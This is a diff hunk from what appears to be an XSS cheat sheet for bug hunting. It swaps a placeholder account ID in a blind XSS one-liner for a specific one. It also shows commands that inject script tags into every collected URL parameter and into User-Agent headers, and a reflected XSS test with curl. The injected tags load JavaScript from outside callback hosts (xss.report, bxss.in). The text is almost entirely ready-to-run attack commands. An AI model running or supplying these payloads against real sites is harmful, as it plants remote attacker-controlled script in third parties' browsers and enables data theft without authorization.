@@ -95,7 +95,7 @@ curl -sG "https://target.com/search" --data-urlencode "q=<svg onload=alert(1)>" 
 
 ```bash
 # Inject blind XSS payloads into all parameters
-cat gf-xss.txt | qsreplace '"><script src=https://xss.report/c/YOUR_ID></script>' | httpx -silent -sc -title -cl -location
+cat gf-xss.txt | qsreplace '"><script src=https://xss.report/c/oddmystic></script>' | httpx -silent -sc -title -cl -location
 
 # User-Agent based blind XSS
 cat https-subs.txt | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>" -silent
